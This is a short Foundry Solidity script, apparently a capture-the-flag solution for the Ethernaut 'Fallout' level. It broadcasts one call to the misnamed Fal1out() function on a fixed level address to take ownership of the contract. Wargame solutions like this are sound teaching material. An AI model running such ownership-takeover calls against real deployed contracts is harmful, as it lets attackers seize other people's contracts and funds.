// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "../instances/Ilevel02.sol";
import "forge-std/Script.sol";

contract Attacker is Script {
    Fallout level02 = Fallout(0xa74a460BE4dF95CBB032a49795d00Efc692fa5D3);

    function run() external {
        vm.startBroadcast();

        level02.Fal1out();

        vm.stopBroadcast();
    }
}
